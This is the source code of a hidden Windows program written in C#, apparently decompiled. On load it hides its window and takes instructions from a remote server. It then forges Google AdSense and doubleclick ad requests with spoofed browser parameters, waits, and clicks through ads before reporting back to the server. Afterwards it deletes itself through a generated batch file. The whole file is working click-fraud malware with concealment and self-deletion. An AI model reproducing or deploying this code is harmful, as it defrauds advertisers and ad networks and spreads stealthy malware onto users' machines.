using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Threading;
using System.Windows.Forms;

namespace TAK;

public class Form1 : Form
{
	private const string id = "Q9C9WTpjiok3UOnqmrWC";

	private IContainer components = null;

	public Form1()
	{
		InitializeComponent();
	}

	private void deleteMe()
	{
		Environment.GetCommandLineArgs();
		string text = "delete.bat";
		string arg = Process.GetCurrentProcess().ProcessName + ".exe";
		using (StreamWriter streamWriter = new StreamWriter(text))
		{
			streamWriter.WriteLine(":top");
			streamWriter.WriteLine("del \"{0}\"", arg);
			streamWriter.WriteLine("IF EXIST \"{0}\" GOTO top", arg);
			streamWriter.WriteLine("del delete.bat");
		}
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text);
		processStartInfo.CreateNoWindow = true;
		Process.Start(processStartInfo);
		Process.GetCurrentProcess().Kill();
	}

	private void doIt()
	{
		clsWWW clsWWW = new clsWWW();
		string fullHttp = clsWWW.getFullHttp("http://t-a-k.com/getdata/default.php?Q9C9WTpjiok3UOnqmrWC&ci");
		fullHttp = fullHttp.Replace(" ", string.Empty);
		string text = clsWWW.parseBetween(fullHttp, "link:", "\"", 50);
		string text2 = clsWWW.parseBetween(fullHttp, "referrer:", "\"", 62);
		string text3 = clsWWW.parseBetween(fullHttp, "click?:", "\"", 58);
		string text4 = clsWWW.parseBetween(fullHttp, "urlid:", "\"", 55);
		string text5 = clsWWW.parseBetween(fullHttp, "id=\"randomdelay\"", "\"", 24);
		Console.WriteLine("link: {0}\treferrer: {1}\tclick?: {2}\turl#: {3}\tdelay: {4} seconds", text, text2, text3, text4, text5);
		clsWWW.Referrer = text2;
		fullHttp = clsWWW.getFullHttp(text);
		if (!fullHttp.Contains("google_ad_client"))
		{
			Console.WriteLine("no google_ad_client for current page");
			return;
		}
		string text6 = clsWWW.parseBetween(fullHttp, "google_ad_client = ", "\"", 20);
		string text7 = clsWWW.parseBetween(fullHttp, "google_ad_slot = ", "\"", 18);
		string empty = string.Empty;
		empty = ((!fullHttp.Contains("\"keywords\"")) ? "hii" : clsWWW.parseBetween(fullHttp, "\"keywords\" content=\"", "\"", 20));
		empty = empty.Replace(" ", "%20");
		Console.WriteLine("google_ad_client = " + text6);
		string text8 = text;
		text8 = text8.Replace(":", "%3A");
		text8 = text8.Replace("/", "%2F");
		int tickCount = Environment.TickCount;
		int num = tickCount + 3;
		int num2 = num + 3;
		int num3 = num2 + 3;
		int num4 = num3 + 3;
		int num5 = num4 + 3;
		int num6 = num5 + 3;
		int num7 = num6 + 3;
		int num8 = num7 + 3;
		string url = string.Format("http://googleads.g.doubleclick.net/pagead/ads?client={0}&output=html&h=60&slotname={1}&w=468&lmt={2}&flash=10.0.32&url={3}%2F&dt={4}&correlator={5}&frm=0&ga_vid=87993496.{6}&ga_sid={6}&ga_hid=498969188&ga_fc=0&u_tz=-420&u_his=1&u_java=1&u_h=1200&u_w=1920&u_ah=1170&u_aw=1920&u_cd=24&u_nplug=16&u_nmime=95&biw=1194&bih=830&fu=0&ifi=1&dtd=257&xpc=fbd5MVuwe4&p={3}", text6, text7, tickCount, text8, num, num2, num3, num4, num5, num6);
		fullHttp = clsWWW.getFullHttp(url);
		url = string.Format("http://googleads.g.doubleclick.net/pagead/ads?client={0}&output=js&lmt={1}&num_ads={2}&skip=0&channel=top_ad_unit&ad_type=text&ea=0&feedback_link=on&flash=10.0.32&hints={3}&url={4}&targeting=content&dt={5}&correlator={6}&frm=0&ga_vid=465206236.1266208877&ga_sid={8}&ga_hid={8}&ga_fc=0&u_tz=-420&u_his=3&u_java=1&u_h=1200&u_w=1920&u_ah=1170&u_aw=1920&u_cd=24&u_nplug=16&u_nmime=95&biw=1369&bih=634&fu=0&ifi=2&dtd=99", text6, empty, text4, text8, num, num2, num3, num4, num5, num6, num7, num8);
		fullHttp = clsWWW.getFullHttp(url);
		string text9 = null;
		if (!fullHttp.Contains("google_ad.n = " + text4))
		{
			if (!fullHttp.Contains("google_ad.n = 1"))
			{
				return;
			}
			text9 = clsWWW.parseBetween(fullHttp, "google_ad.n = 1", "google_ad = ", 0);
			text9 = clsWWW.parseBetween(text9, ".url = ", "\";", 8);
		}
		else
		{
			text9 = clsWWW.parseBetween(fullHttp, "google_ad.n = " + text4, "google_ad = ", 0);
			text9 = clsWWW.parseBetween(text9, ".url = ", "\";", 8);
		}
		text9 = text9.Replace("%2F", "/");
		text9 = text9.Replace("%3A", ":");
		text9 = text9.Replace("&amp;", "&");
		text9 = text9.Replace("%3D", "=");
		text9 = text9.Replace("%26", "&");
		text9 = text9.Replace("%2B", "+");
		Console.WriteLine("extracted " + text9 + "\r\nwaiting " + text5 + " seconds before clicking through ...");
		Thread.Sleep(1000 * int.Parse(text5));
		if (text3 == "y")
		{
			Console.WriteLine("ok delayed long enough.  clicking through ...");
			fullHttp = clsWWW.getFullHttp(text9);
			if (string.IsNullOrEmpty(fullHttp))
			{
				Console.WriteLine("failed!");
				return;
			}
			fullHttp = clsWWW.getFullHttp("http://t-a-k.com/getdata/default.php?Q9C9WTpjiok3UOnqmrWC&cv=" + text4 + "&cc=" + text4);
			Console.WriteLine("done!");
		}
		else
		{
			fullHttp = clsWWW.getFullHttp("http://t-a-k.com/getdata/default.php?Q9C9WTpjiok3UOnqmrWC&cv=" + text4);
			Console.WriteLine("skipped clicking");
		}
	}

	private void button1_Click(object sender, EventArgs e)
	{
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		((Control)this).Hide();
		doIt();
		while (true)
		{
			try
			{
				deleteMe();
			}
			catch
			{
			}
			Thread.Sleep(1000);
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(629, 254));
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("CODE IS IN FORM... NO GUI");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}
}
